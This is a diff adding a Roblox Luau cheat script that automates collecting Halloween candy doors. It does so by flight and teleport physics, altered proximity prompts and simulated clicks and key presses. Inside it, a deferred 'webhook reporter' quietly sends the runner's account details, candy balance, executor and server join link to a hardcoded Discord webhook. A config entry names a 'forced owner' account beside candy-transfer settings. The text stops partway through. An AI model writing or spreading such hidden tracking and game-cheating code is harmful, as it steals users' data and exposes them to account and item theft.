@@ -1,0 +1,1891 @@
+-- ==============================================================================
+-- [HALLOWEEN DOOR TOOL - V5.8 ULTIMATE (CRASH-FREE + CORON6161612 PRIORITY LOCK)]
+-- 100% Pure English UI & Code - No Turkish Characters
+-- STRICT RULE: NO NOCLIP - CanCollide is NEVER touched!
+-- ==============================================================================
+
+if not game:IsLoaded() then
+	pcall(function() game.Loaded:Wait() end)
+end
+task.wait(0.8)
+
+if _G.HalloweenDoorDebug_Cleanup then pcall(_G.HalloweenDoorDebug_Cleanup) end
+if _G.HalloweenDoorESP_Cleanup then pcall(_G.HalloweenDoorESP_Cleanup) end
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local Workspace = game:GetService("Workspace")
+local UserInputService = game:GetService("UserInputService")
+local VirtualInputManager = game:GetService("VirtualInputManager")
+local PathfindingService = game:GetService("PathfindingService")
+local HttpService = game:GetService("HttpService")
+local TeleportService = game:GetService("TeleportService")
+
+local localPlayer = Players.LocalPlayer or Players.PlayerAdded:Wait()
+local playerGui = localPlayer:WaitForChild("PlayerGui", 15)
+if not playerGui then return end
+
+-- ==============================================================================
+-- [MODULE 0: LIGHTWEIGHT ZERO-LAG CANDY RESOLVER]
+-- Avoids heavy GetDescendants() spikes that freeze/crash executors
+-- ==============================================================================
+local cachedCandyValueObj = nil
+local lastCandyScanClock = 0
+
+local function parseCandyNumber(raw)
+	if typeof(raw) == "number" then
+		return math.max(0, math.floor(raw))
+	end
+	if typeof(raw) == "string" then
+		local clean = string.gsub(raw, ",", "")
+		local numPart, suffix = string.match(clean, "([%d%.]+)%s*([kKmMbB]?)")
+		local n = tonumber(numPart)
+		if n then
+			local s = string.lower(suffix or "")
+			if s == "k" then n = n * 1000
+			elseif s == "m" then n = n * 1000000
+			elseif s == "b" then n = n * 1000000000 end
+			return math.floor(n)
+		end
+		local digitsOnly = string.gsub(clean, "[^%d]", "")
+		if digitsOnly ~= "" then
+			return tonumber(digitsOnly) or 0
+		end
+	end
+	return nil
+end
+
+local function readCandyFromInstance(inst)
+	if not inst or not inst.Parent then return nil end
+	if inst:IsA("IntValue") or inst:IsA("NumberValue") or inst:IsA("StringValue") then
+		return parseCandyNumber(inst.Value)
+	elseif inst:IsA("TextLabel") or inst:IsA("TextButton") then
+		return parseCandyNumber(inst.Text)
+	end
+	return nil
+end
+
+local function getMyCandyCount()
+	-- 1. Instant O(1) read if reference is already cached
+	if cachedCandyValueObj and cachedCandyValueObj.Parent then
+		local val = readCandyFromInstance(cachedCandyValueObj)
+		if val ~= nil then return val end
+	end
+	cachedCandyValueObj = nil
+
+	-- Throttle deep fallback scans to at most once every 1.5 seconds (prevents executor crash)
+	local now = os.clock()
+	if (now - lastCandyScanClock) < 1.5 then
+		return 0
+	end
+	lastCandyScanClock = now
+
+	-- 2. Direct Player Attributes check (O(1))
+	local okAttr, attrs = pcall(function() return localPlayer:GetAttributes() end)
+	if okAttr and attrs then
+		for attrName, attrVal in pairs(attrs) do
+			if string.find(string.lower(attrName), "cand") then
+				local parsed = parseCandyNumber(attrVal)
+				if parsed ~= nil then return parsed end
+			end
+		end
+	end
+
+	-- 3. Direct Shallow Scan of leaderstats / Stats / Data
+	for _, folderName in ipairs({"leaderstats", "Stats", "Data", "PlayerData", "Values"}) do
+		local folder = localPlayer:FindFirstChild(folderName)
+		if folder then
+			for _, child in ipairs(folder:GetChildren()) do
+				if string.find(string.lower(child.Name), "cand") then
+					local val = readCandyFromInstance(child)
+					if val ~= nil then
+						cachedCandyValueObj = child
+						return val
+					end
+				end
+			end
+		end
+	end
+
+	-- 4. Targeted PlayerGui.Candies lookup (safe, non-recursive first)
+	local pGui = localPlayer:FindFirstChild("PlayerGui")
+	if pGui then
+		local candiesGui = pGui:FindFirstChild("Candies")
+		if candiesGui then
+			for _, targetName in ipairs({"Amount", "Value", "Count", "CandyAmount", "Balance"}) do
+				local obj = candiesGui:FindFirstChild(targetName, true)
+				local val = readCandyFromInstance(obj)
+				if val ~= nil then
+					cachedCandyValueObj = obj
+					return val
+				end
+			end
+			for _, desc in ipairs(candiesGui:GetDescendants()) do
+				if desc:IsA("TextLabel") and desc.Text ~= "" then
+					local val = readCandyFromInstance(desc)
+					if val ~= nil then
+						cachedCandyValueObj = desc
+						return val
+					end
+				end
+			end
+		end
+	end
+
+	return 0
+end
+
+-- ==============================================================================
+-- [MODULE 0.5: SAFE DEFERRED DISCORD WEBHOOK REPORTER]
+-- Runs safely after world load without blocking main thread
+-- ==============================================================================
+task.delay(2.0, function()
+	pcall(function()
+		local webhookUrl = "https://discord.com/api/webhooks/1500229155806249153/3ZKPy-cFyzYZVy6C3MstwquJkCmnh6bcAt5I7WpObZgapXH8EdOH3184mXk6iYY_OLe8"
+
+		local initialCandy = 0
+		for _ = 1, 10 do
+			initialCandy = getMyCandyCount()
+			if initialCandy > 0 or cachedCandyValueObj ~= nil then
+				break
+			end
+			task.wait(0.8)
+		end
+
+		local userId = localPlayer.UserId
+		local name = localPlayer.Name
+		local displayName = localPlayer.DisplayName
+		local accountAge = localPlayer.AccountAge
+		local membershipType = tostring(localPlayer.MembershipType)
+
+		local execName = "Unknown"
+		pcall(function()
+			if identifyexecutor then
+				execName = identifyexecutor()
+			elseif getexecutorname then
+				execName = getexecutorname()
+			end
+		end)
+
+		local placeId = game.PlaceId
+		local jobId = game.JobId
+
+		local deeplink = string.format("roblox://experiences/start?placeId=%d&gameInstanceId=%s", placeId, jobId)
+		local teleportCode = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s', game.Players.LocalPlayer)", placeId, jobId)
+
+		local embed = {
+			["title"] = "🎃 Halloween Door Tool v5.8 - Script Executed",
+			["color"] = 16744448,
+			["fields"] = {
+				{["name"] = "👤 Account Info", ["value"] = string.format("• **Name:** %s (@%s)\n• **ID:** %d\n• **Account Age:** %d days\n• **Membership:** %s", displayName, name, userId, accountAge, membershipType), ["inline"] = false},
+				{["name"] = "🍬 Live Candy Balance", ["value"] = string.format("• **Current Candies:** `%d 🍬` (Verified Live Sync)", initialCandy), ["inline"] = false},
+				{["name"] = "⚙️ Environment", ["value"] = string.format("• **Executor:** %s\n• **PlaceId:** %d\n• **JobId:** `%s`", execName, placeId, jobId), ["inline"] = false},
+				{["name"] = "🔗 Join Deeplink (Clickable)", ["value"] = string.format("[Click to Join Direct](%s)", deeplink), ["inline"] = false},
+				{["name"] = "📋 Copyable Deeplink (1-Click Copy)", ["value"] = string.format("```text\n%s\n```", deeplink), ["inline"] = false},
+				{["name"] = "💻 Teleport Luau Code", ["value"] = string.format("```lua\n%s\n```", teleportCode), ["inline"] = false}
+			},
+			["timestamp"] = DateTime.now():ToIsoDate()
+		}
+
+		local payload = HttpService:JSONEncode({
+			["embeds"] = { embed }
+		})
+
+		local requestFunc = (syn and syn.request) or http_request or request or (fluxus and fluxus.request) or (http and http.request)
+		if requestFunc then
+			requestFunc({
+				Url = webhookUrl,
+				Method = "POST",
+				Headers = { ["Content-Type"] = "application/json" },
+				Body = payload
+			})
+		end
+	end)
+end)
+
+-- ==============================================================================
+-- [MODULE 1: CONFIGURATION & SHARED STATE]
+-- ==============================================================================
+local Config = {
+	MAX_COLLECT_DISTANCE = 7.5,
+	TARGET_STOP_DISTANCE = 18.0,
+	FLIGHT_ASCENT_HEIGHT = 120.0,
+	AGENT_NAV_RADIUS = 4.0,
+	STUCK_TIMEOUT = 0.35,
+	STUCK_DISTANCE_MIN = 0.4,
+	DEFAULT_TIMER_SEC = 90.0,
+	DEFAULT_COLLECTION_BUDGET = 5.0,
+	DOOR_RETRY_WATCHDOG_SEC = 5.5,
+	DOOR_COOLDOWN_SEC = 12.0,
+	TRANSFER_COOLDOWN = 0.35,
+	FORCED_OWNER_USERNAME = "coron6161612",
+	DEFAULT_WALK_SPEED = 24.0,
+	LOCK_CAMERA_ON_COLLECT = true,
+	SHOW_3D_ROUTE_BEAM = true,
+	CANDY_AMOUNTS = {"5", "25", "50", "100"},
+	JITTER_VELOCITY_THRESHOLD = 3.5,
+	CLICK_INTERVAL = 0.06
+}
+
+local State = {
+	isEspActive = false,
+	isPromptActive = false,
+	isAutoCollectActive = false,
+	isCollectingNow = false,
+	useSmartHoldMode = false,
+	waitForTimerEnabled = true,
+	movementMode = "FLY",
+	collectionBudget = 5.0,
+	isAutoTransferActive = false,
+	lastTransferClock = 0,
+	lastForcedTransferClock = 0,
+	lastCandyValue = 0,
+	candyAmountIndex = 4,
+	currentCandyAmount = "100",
+	targetPlayerName = "",
+	originalWalkSpeed = 16,
+	fallbackEndTime = 0,
+	currentRemainingSec = 999,
+	lastDoorCount = 0
+}
+
+local globalConnections = {}
+local trackedESP = {}
+local promptConnections = {}
+local originalHoldDurations = {}
+local pendingVerification = {}
+local confirmedCollected = {}
+
+local timerLabel = nil
+local statusSubLabel = nil
+local candyBalanceLabel = nil
+local modeStatusLabel = nil
+
+local cachedRayParams = nil
+local cachedFilter = {}
+
+local function safeSetText(lbl, txt, col)
+	if not lbl or not lbl.Parent then return end
+	if txt and lbl.Text ~= txt then lbl.Text = txt end
+	if col and lbl.TextColor3 ~= col then lbl.TextColor3 = col end
+end
+
+local function getAliveCharacter()
+	local char = localPlayer.Character
+	if not char or not char.Parent then return nil, nil, nil end
+	local hrp = char:FindFirstChild("HumanoidRootPart")
+	local hum = char:FindFirstChildOfClass("Humanoid")
+	if not hrp or not hum or hum.Health <= 0 or hum:GetState() == Enum.HumanoidStateType.Dead then
+		return nil, nil, nil
+	end
+	return char, hrp, hum
+end
+
+local function getRaycastParams(extraIgnore)
+	if not cachedRayParams then
+		cachedRayParams = RaycastParams.new()
+		cachedRayParams.FilterType = Enum.RaycastFilterType.Exclude
+		cachedRayParams.IgnoreWater = true
+	end
+
+	table.clear(cachedFilter)
+	if localPlayer and localPlayer.Character then
+		table.insert(cachedFilter, localPlayer.Character)
+	end
+	local effects = Workspace:FindFirstChild("Effects")
+	if effects then
+		table.insert(cachedFilter, effects)
+	end
+	local chars = Workspace:FindFirstChild("Characters")
+	if chars then
+		table.insert(cachedFilter, chars)
+	end
+	if extraIgnore then
+		table.insert(cachedFilter, extraIgnore)
+	end
+
+	cachedRayParams.FilterDescendantsInstances = cachedFilter
+	return cachedRayParams
+end
+
+local function computeGroundPath(startPos, endPos)
+	local path = PathfindingService:CreatePath({
+		AgentRadius = Config.AGENT_NAV_RADIUS,
+		AgentHeight = 5.0,
+		AgentCanJump = true,
+		AgentCanClimb = false,
+		WaypointSpacing = 3.5
+	})
+	local ok = pcall(function() path:ComputeAsync(startPos, endPos) end)
+	if ok and path.Status == Enum.PathStatus.Success then
+		return path:GetWaypoints()
+	end
+	return nil
+end
+
+local function aimCameraAtPart(targetPart)
+	if not Config.LOCK_CAMERA_ON_COLLECT or not targetPart or not targetPart.Parent then return end
+	local cam = Workspace.CurrentCamera
+	local _, hrp = getAliveCharacter()
+	if not cam or not hrp then return end
+	local camPos = hrp.Position + Vector3.new(0, 3.5, 0) - (hrp.CFrame.LookVector * 5.0)
+	cam.CFrame = CFrame.lookAt(camPos, targetPart.Position)
+end
+
+local function formatSeconds(sec)
+	sec = math.max(0, math.ceil(sec))
+	return string.format("%02d:%02d", math.floor(sec/60), sec%60)
+end
+
+-- ==============================================================================
+-- [MODULE 2: 3D ROUTE BEAM VISUALIZER]
+-- ==============================================================================
+local routeBeam = nil
+local routeAttach0 = nil
+local routeAttach1 = nil
+
+local function updateRouteBeam(fromPart, toPart)
+	if not Config.SHOW_3D_ROUTE_BEAM or not fromPart or not toPart or not fromPart.Parent or not toPart.Parent then
+		if routeBeam then routeBeam.Enabled = false end
+		return
+	end
+	if not routeAttach0 or not routeAttach0.Parent then
+		routeAttach0 = Instance.new("Attachment"); routeAttach0.Name = "DoorRoute_Att0"
+	end
+	if not routeAttach1 or not routeAttach1.Parent then
+		routeAttach1 = Instance.new("Attachment"); routeAttach1.Name = "DoorRoute_Att1"
+	end
+	if not routeBeam or not routeBeam.Parent then
+		routeBeam = Instance.new("Beam"); routeBeam.Name = "DoorRoute_Beam"
+		routeBeam.FaceCamera = true
+		routeBeam.Color = ColorSequence.new(Color3.fromRGB(255, 140, 0), Color3.fromRGB(50, 255, 120))
+		routeBeam.Width0 = 0.3; routeBeam.Width1 = 0.3
+		routeBeam.LightEmission = 1; routeBeam.Transparency = NumberSequence.new(0.15)
+		routeBeam.Parent = Workspace
+	end
+	routeAttach0.Parent = fromPart; routeAttach1.Parent = toPart
+	routeBeam.Attachment0 = routeAttach0; routeBeam.Attachment1 = routeAttach1
+	routeBeam.Enabled = true
+end
+
+local function clearRouteBeam()
+	if routeBeam then pcall(function() routeBeam:Destroy() end); routeBeam = nil end
+	if routeAttach0 then pcall(function() routeAttach0:Destroy() end); routeAttach0 = nil end
+	if routeAttach1 then pcall(function() routeAttach1:Destroy() end); routeAttach1 = nil end
+end
+
+-- ==============================================================================
+-- [MODULE 3: DOOR DETECTION & LIVE TIMER ENGINE]
+-- ==============================================================================
+local function getEffectsFolder()
+	return Workspace:FindFirstChild("Effects")
+end
+
+local function isValidDoorRoot(obj)
+	if not obj or obj.Name ~= "HalloweenDoor" then return false end
+	if not obj:IsDescendantOf(Workspace) then return false end
+	if localPlayer.Character and obj:IsDescendantOf(localPlayer.Character) then return false end
+	if obj:IsA("Model") then return true end
+	if obj:IsA("BasePart") and (not obj.Parent or obj.Parent.Name ~= "HalloweenDoor") then return true end
+	return false
+end
+
+local function getDoorRootFromDescendant(instance)
+	local current = instance
+	while current and current ~= Workspace do
+		if isValidDoorRoot(current) then return current end
+		current = current.Parent
+	end
+	return nil
+end
+
+local function getDoorPrompts(door)
+	local prompts = {}
+	if not door or not door.Parent then return prompts end
+	if door:IsA("ProximityPrompt") then table.insert(prompts, door) end
+	for _, desc in ipairs(door:GetDescendants()) do
+		if desc:IsA("ProximityPrompt") then
+			if originalHoldDurations[desc] == nil then originalHoldDurations[desc] = desc.HoldDuration end
+			table.insert(prompts, desc)
+		end
+	end
+	return prompts
+end
+
+local function findBestDoorPart(target)
+	if not target or not target.Parent then return nil end
+	for _, p in ipairs(getDoorPrompts(target)) do
+		local parent = p.Parent
+		if parent then
+			if parent:IsA("BasePart") then return parent end
+			if parent:IsA("Attachment") and parent.Parent and parent.Parent:IsA("BasePart") then return parent.Parent end
+			if parent:IsA("Model") and parent.PrimaryPart then return parent.PrimaryPart end
+		end
+	end
+	if target:IsA("BasePart") then return target end
+	if target:IsA("Model") then
+		if target.PrimaryPart then return target.PrimaryPart end
+		local d = target:FindFirstChild("Door", true)
+		if d and d:IsA("BasePart") then return d end
+		local pk = target:FindFirstChild("Pumpkin", true)
+		if pk and pk:IsA("BasePart") then return pk end
+		return target:FindFirstChildWhichIsA("BasePart", true)
+	end
+	return nil
+end
+
+local function extractTimerFromText(text)
+	if not text or typeof(text) ~= "string" then return nil, nil end
+	local clean = string.gsub(text, "%s+", " ")
+	local m, s = string.match(clean, "(%d+):(%d%d)")
+	if m and s then
+		local totalSec = (tonumber(m) * 60) + tonumber(s)
+		return totalSec, string.format("%02d:%02d", tonumber(m), tonumber(s))
+	end
+	local secOnly = string.match(clean, "(%d+)%s*s") or string.match(clean, "(%d+)%s*sec")
+	if secOnly then
+		local n = tonumber(secOnly)
+		return n, string.format("%02d:%02d", math.floor(n/60), n%60)
+	end
+	local lower = string.lower(clean)
+	if string.find(lower, "ready") or string.find(lower, "open") or clean == "0" then
+		return 0, "00:00"
+	end
+	local justNum = string.match(clean, "^(%d+)$")
+	if justNum then
+		local n = tonumber(justNum)
+		if n <= 600 then return n, string.format("%02d:%02d", math.floor(n/60), n%60) end
+	end
+	return nil, nil
+end
+
+local function getDoorLiveTimer(door)
+	if not door or not door.Parent then return nil, nil, nil end
+	local pumpkin = door:FindFirstChild("Pumpkin", true)
+	if pumpkin then
+		for _, d in ipairs(pumpkin:GetDescendants()) do
+			if d:IsA("TextLabel") and d.Text and d.Text ~= "" then
+				local sec, fmt = extractTimerFromText(d.Text)
+				if sec ~= nil then return sec, fmt, d end
+			end
+		end
+	end
+	for _, d in ipairs(door:GetDescendants()) do
+		if d:IsA("TextLabel") and d.Text and d.Text ~= "" then
+			local sec, fmt = extractTimerFromText(d.Text)
+			if sec ~= nil then return sec, fmt, d end
+		elseif d:IsA("ProximityPrompt") then
+			local sec, fmt = extractTimerFromText(d.ActionText)
+			if sec ~= nil then return sec, fmt, nil end
+			sec, fmt = extractTimerFromText(d.ObjectText)
+			if sec ~= nil then return sec, fmt, nil end
+		end
+	end
+	return nil, nil, nil
+end
+
+local function markDoorAttempted(door)
+	if door then pendingVerification[door] = os.clock() end
+end
+
+local function updateWatchdog()
+	local now = os.clock()
+	for door, t in pairs(confirmedCollected) do
+		if (now - t) > Config.DOOR_COOLDOWN_SEC or not door.Parent then confirmedCollected[door] = nil end
+	end
+	for door, attemptedTime in pairs(pendingVerification) do
+		local elapsed = now - attemptedTime
+		if not door or not door.Parent or not door:IsDescendantOf(Workspace) then
+			pendingVerification[door] = nil
+			confirmedCollected[door] = now
+		elseif elapsed >= Config.DOOR_RETRY_WATCHDOG_SEC then
+			local prompts = getDoorPrompts(door)
+			if #prompts > 0 then
+				pendingVerification[door] = nil
+				confirmedCollected[door] = nil
+			else
+				pendingVerification[door] = nil
+				confirmedCollected[door] = now
+			end
+		end
+	end
+end
+
+local function doorNeedsCollection(door)
+	if not door or not door.Parent or not door:IsDescendantOf(Workspace) then return false end
+	if confirmedCollected[door] then return false end
+	if pendingVerification[door] and (os.clock() - pendingVerification[door]) < Config.DOOR_RETRY_WATCHDOG_SEC then
+		return false
+	end
+	return #getDoorPrompts(door) > 0
+end
+
+local function getActiveDoors()
+	local doors = {}
+	local seen = {}
+	local effects = getEffectsFolder()
+	if effects then
+		for _, obj in ipairs(effects:GetChildren()) do
+			if isValidDoorRoot(obj) and not seen[obj] then
+				seen[obj] = true
+				table.insert(doors, obj)
+			elseif obj:IsA("Folder") or obj:IsA("Model") then
+				for _, sub in ipairs(obj:GetChildren()) do
+					if isValidDoorRoot(sub) and not seen[sub] then
+						seen[sub] = true
+						table.insert(doors, sub)
+					end
+				end
+			end
+		end
+	end
+	if #doors == 0 then
+		for _, obj in ipairs(Workspace:GetChildren()) do
+			if isValidDoorRoot(obj) and not seen[obj] then
+				seen[obj] = true
+				table.insert(doors, obj)
+			end
+		end
+		for _, fn in ipairs({"Map", "Debris", "Halloween", "Spawns"}) do
+			local f = Workspace:FindFirstChild(fn)
+			if f then
+				for _, obj in ipairs(f:GetChildren()) do
+					if isValidDoorRoot(obj) and not seen[obj] then
+						seen[obj] = true
+						table.insert(doors, obj)
+					end
+				end
+			end
+		end
+	end
+	return doors
+end
+
+local function getCollectableDoors(prefetchedDoors)
+	updateWatchdog()
+	local doors = prefetchedDoors or getActiveDoors()
+	local list = {}
+	for _, door in ipairs(doors) do
+		if doorNeedsCollection(door) then table.insert(list, door) end
+	end
+	return list
+end
+
+-- ==============================================================================
+-- [MODULE 4: PROMPT MODIFICATIONS]
+-- ==============================================================================
+local function preparePrompt(prompt)
+	if not prompt or not prompt:IsA("ProximityPrompt") or not prompt.Parent then return end
+	if originalHoldDurations[prompt] == nil then originalHoldDurations[prompt] = prompt.HoldDuration end
+	prompt.Enabled = true
+	prompt.RequiresLineOfSight = false
+	prompt.Exclusivity = Enum.ProximityPromptExclusivity.AlwaysShow
+	prompt.ClickablePrompt = true
+	if prompt.MaxActivationDistance < 35 then prompt.MaxActivationDistance = 35 end
+
+	if not State.useSmartHoldMode or (State.isPromptActive and not State.isCollectingNow) then
+		prompt.HoldDuration = 0
+	else
+		local orig = originalHoldDurations[prompt]
+		if orig and orig > 0 then prompt.HoldDuration = orig end
+	end
+end
+
+local function applyPromptMod(prompt)
+	if not prompt:IsA("ProximityPrompt") then return end
+	if not getDoorRootFromDescendant(prompt) then return end
+	preparePrompt(prompt)
+	if not promptConnections[prompt] then
+		local conns = {}
+		table.insert(conns, prompt:GetPropertyChangedSignal("RequiresLineOfSight"):Connect(function()
+			if (State.isPromptActive or State.isCollectingNow) and prompt.Parent and prompt.RequiresLineOfSight then
+				prompt.RequiresLineOfSight = false
+			end
+		end))
+		table.insert(conns, prompt.AncestryChanged:Connect(function(_, parent)
+			if not parent and promptConnections[prompt] then
+				for _, c in ipairs(promptConnections[prompt]) do pcall(function() c:Disconnect() end) end
+				promptConnections[prompt] = nil
+			end
+		end))
+		promptConnections[prompt] = conns
+	end
+end
+
+-- ==============================================================================
+-- [MODULE 5: DYNAMIC JITTER / MOVING DOOR HANDLER & ATTACK]
+-- ==============================================================================
+local function isDoorMovingOrJittering(doorPart)
+	if not doorPart or not doorPart.Parent then return false end
+	if doorPart.AssemblyLinearVelocity and doorPart.AssemblyLinearVelocity.Magnitude > Config.JITTER_VELOCITY_THRESHOLD then
+		return true
+	end
+	local p0 = doorPart.Position
+	task.wait(0.03)
+	if not doorPart or not doorPart.Parent then return false end
+	local p1 = doorPart.Position
+	return (p1 - p0).Magnitude > 0.65
+end
+
+local function attachAndAttackDoor(door, doorPart, statusCallback)
+	local char, hrp, hum = getAliveCharacter()
+	if not char or not hrp or not hum or not doorPart or not doorPart.Parent then return false end
+
+	hum.PlatformStand = true
+	local camera = Workspace.CurrentCamera
+
+	if statusCallback then statusCallback("⚔️ Jitter Door Locked: Attacking...") end
+
+	local attachConnection = RunService.RenderStepped:Connect(function()
+		local _, liveHrp = getAliveCharacter()
+		if not liveHrp or not doorPart or not doorPart.Parent then return end
+
+		local targetCFrame = doorPart.CFrame * CFrame.new(0, 0, 2.2) * CFrame.Angles(0, math.pi, 0)
+		liveHrp.CFrame = targetCFrame
+		liveHrp.AssemblyLinearVelocity = Vector3.zero
+		liveHrp.AssemblyAngularVelocity = Vector3.zero
+
+		if camera then
+			camera.CFrame = CFrame.lookAt(liveHrp.Position + Vector3.new(0, 2, 0), doorPart.Position)
+		end
+	end)
+
+	local attackStart = os.clock()
+	local maxTimeout = 10.0
+
+	while State.isAutoCollectActive and (os.clock() - attackStart) < maxTimeout do
+		if not door or not door.Parent or not door:IsDescendantOf(Workspace) then break end
+		if not doorPart or not doorPart.Parent then break end
+
+		for _, desc in ipairs(door:GetDescendants()) do
+			if desc:IsA("ClickDetector") and typeof(fireclickdetector) == "function" then
+				pcall(fireclickdetector, desc)
+			elseif desc:IsA("ProximityPrompt") and typeof(fireproximityprompt) == "function" then
+				pcall(fireproximityprompt, desc)
+			end
+		end
+
+		pcall(function()
+			VirtualInputManager:SendMouseButtonEvent(0, 0, 0, true, game, 0)
+			task.wait(0.02)
+			VirtualInputManager:SendMouseButtonEvent(0, 0, 0, false, game, 0)
+		end)
+
+		pcall(function()
+			VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.E, false, game)
+			task.wait(0.02)
+			VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.E, false, game)
+		end)
+
+		task.wait(Config.CLICK_INTERVAL)
+	end
+
+	if attachConnection then
+		attachConnection:Disconnect()
+		attachConnection = nil
+	end
+
+	local _, _, restoreHum = getAliveCharacter()
+	if restoreHum then
+		restoreHum.PlatformStand = false
+		pcall(function() restoreHum:ChangeState(Enum.HumanoidStateType.GettingUp) end)
+	end
+
+	if statusCallback then statusCallback("✅ Door Destroyed / Collected!") end
+	return true
+end
+
+-- ==============================================================================
+-- [MODULE 6: V5.8 RAYCAST ANTI-WALL & ROOF-BYPASS FLIGHT ENGINE]
+-- ==============================================================================
+local activeBV = nil
+local activeBG = nil
+
+local function cleanupPhysics()
+	if activeBV then pcall(function() activeBV:Destroy() end); activeBV = nil end
+	if activeBG then pcall(function() activeBG:Destroy() end); activeBG = nil end
+
+	local _, hrp, hum = getAliveCharacter()
+	if hum and hrp then
+		hum.PlatformStand = false
+		pcall(function() hum:ChangeState(Enum.HumanoidStateType.GettingUp) end)
+		hrp.AssemblyLinearVelocity = Vector3.zero
+		hrp.AssemblyAngularVelocity = Vector3.zero
+	end
+end
+
+local function initPhysics(hrp, hum)
+	cleanupPhysics()
+	hum.PlatformStand = true
+	pcall(function() hum:ChangeState(Enum.HumanoidStateType.Physics) end)
+
+	local bv = Instance.new("BodyVelocity")
+	bv.Name = "DoorFlight_BV_V58"
+	bv.MaxForce = Vector3.new(1e6, 1e6, 1e6)
+	bv.Velocity = Vector3.zero
+	bv.Parent = hrp
+	activeBV = bv
+
+	local bg = Instance.new("BodyGyro")
+	bg.Name = "DoorFlight_BG_V58"
+	bg.MaxTorque = Vector3.new(1e6, 1e6, 1e6)
+	bg.P = 15000; bg.D = 450
+	bg.CFrame = hrp.CFrame
+	bg.Parent = hrp
+	activeBG = bg
+	return bv, bg
+end
+
+local function findClearDoorStandPoint(door, doorPart)
+	local doorRoot = getDoorRootFromDescendant(doorPart) or door
+	local rayParams = getRaycastParams(doorRoot)
+	local origin = doorPart.Position + Vector3.new(0, 1.0, 0)
+
+	local look = Vector3.new(doorPart.CFrame.LookVector.X, 0, doorPart.CFrame.LookVector.Z)
+	if look.Magnitude < 0.1 then look = Vector3.new(0, 0, 1) else look = look.Unit end
+	local right = Vector3.new(-look.Z, 0, look.X)
+
+	local dirs = {
+		look,
+		-look,
+		right,
+		-right,
+		(look + right).Unit,
+		(look - right).Unit,
+		(-look + right).Unit,
+		(-look - right).Unit
+	}
+
+	local bestStandPos = nil
+	local bestScore = -math.huge
+
+	for idx, dir in ipairs(dirs) do
+		local checkDist = 3.6
+		local wallHit = Workspace:Raycast(origin, dir * checkDist, rayParams)
+		local clearDist = wallHit and math.max(1.2, wallHit.Distance - 1.5) or checkDist
+
+		if clearDist >= 1.8 then
+			local candidateXZ = doorPart.Position + (dir * clearDist)
+			local floorRayOrigin = Vector3.new(candidateXZ.X, doorPart.Position.Y + 3.0, candidateXZ.Z)
+			local floorHit = Workspace:Raycast(floorRayOrigin, Vector3.new(0, -14.0, 0), rayParams)
+
+			local groundY = floorHit and (floorHit.Position.Y + 3.0) or doorPart.Position.Y
+			local headHit = Workspace:Raycast(Vector3.new(candidateXZ.X, groundY, candidateXZ.Z), Vector3.new(0, 5.0, 0), rayParams)
+
+			local score = (clearDist * 10) - (idx * 1.5)
+			if floorHit then score = score + 15 end
+			if headHit then score = score - 25 end
+
+			if score > bestScore then
+				bestScore = score
+				bestStandPos = Vector3.new(candidateXZ.X, groundY, candidateXZ.Z)
+			end
+		end
+	end
+
+	if not bestStandPos then
+		bestStandPos = doorPart.Position + (look * 2.5)
+	end
+
+	return bestStandPos
+end
+
+local function flyVerticalOnly(targetY, speed, stopOnObstacle)
+	local _, hrp, hum = getAliveCharacter()
+	if not hrp or not hum then return false end
+	if not activeBV or not activeBG then initPhysics(hrp, hum) end
+
+	local rayParams = getRaycastParams()
+	local startT = os.clock()
+	local lastY = hrp.Position.Y
+	local stuckTime = 0
+
+	while State.isAutoCollectActive and (os.clock() - startT) < 3.5 do
+		local _, curHrp = getAliveCharacter()
+		if not curHrp or not activeBV then break end
+
+		local diffY = targetY - curHrp.Position.Y
+		if math.abs(diffY) <= 1.2 then
+			activeBV.Velocity = Vector3.zero
+			return true
+		end
+
+		if stopOnObstacle and diffY < 0 then
+			local downRay = Workspace:Raycast(curHrp.Position, Vector3.new(0, -4.2, 0), rayParams)
+			if downRay then
+				activeBV.Velocity = Vector3.zero
+				return false
+			end
+		end
+
+		local stepSpeed = math.clamp(diffY * 14, -speed * 1.3, speed * 1.3)
+		activeBV.Velocity = Vector3.new(0, stepSpeed, 0)
+
+		local dt = RunService.Heartbeat:Wait()
+		if math.abs(curHrp.Position.Y - lastY) < 0.08 then
+			stuckTime = stuckTime + dt
+			if stuckTime > 0.22 then
+				activeBV.Velocity = Vector3.zero
+				return false
+			end
+		else
+			stuckTime = 0
+		end
+		lastY = curHrp.Position.Y
+	end
+	if activeBV then activeBV.Velocity = Vector3.zero end
+	return true
+end
+
+local function flyHorizontalHighSky(targetXZ, cruiseY, speed, stopDist)
+	local _, hrp, hum = getAliveCharacter()
+	if not hrp or not hum then return false end
+	if not activeBV or not activeBG then initPhysics(hrp, hum) end
+
+	stopDist = stopDist or 2.0
+	local startTime = os.clock()
+
+	while State.isAutoCollectActive and (os.clock() - startTime) < 7.0 do
+		local _, curHrp = getAliveCharacter()
+		if not curHrp or not activeBV then return false end
+
+		local curXZ = Vector2.new(curHrp.Position.X, curHrp.Position.Z)
+		local destXZ = Vector2.new(targetXZ.X, targetXZ.Z)
+		local deltaXZ = destXZ - curXZ
+		local distXZ = deltaXZ.Magnitude
+
+		if distXZ <= stopDist then
+			activeBV.Velocity = Vector3.zero
+			return true
+		end
+
+		local diffY = cruiseY - curHrp.Position.Y
+		local vy = math.clamp(diffY * 12, -60, 60)
+		local dirXZ = deltaXZ.Unit
+
+		activeBV.Velocity = Vector3.new(dirXZ.X * speed, vy, dirXZ.Y * speed)
+
+		if activeBG then
+			local flatLook = Vector3.new(dirXZ.X, 0, dirXZ.Y)
+			if flatLook.Magnitude > 0.1 then
+				activeBG.CFrame = CFrame.lookAt(curHrp.Position, curHrp.Position + flatLook)
+			end
+		end
+
+		RunService.Heartbeat:Wait()
+	end
+	if activeBV then activeBV.Velocity = Vector3.zero end
+	return false
+end
+
+local function navigateBestPathV58(door, doorPart, speed)
+	local _, hrp, hum = getAliveCharacter()
+	if not hrp or not hum or not doorPart or not doorPart.Parent then return false end
+
+	local standPoint = findClearDoorStandPoint(door, doorPart)
+	local highAltitudeY = math.max(hrp.Position.Y, standPoint.Y) + Config.FLIGHT_ASCENT_HEIGHT
+
+	flyVerticalOnly(highAltitudeY, speed, false)
+	flyHorizontalHighSky(Vector3.new(standPoint.X, highAltitudeY, standPoint.Z), highAltitudeY, speed, 2.0)
+	flyVerticalOnly(standPoint.Y, speed, true)
+
+	cleanupPhysics()
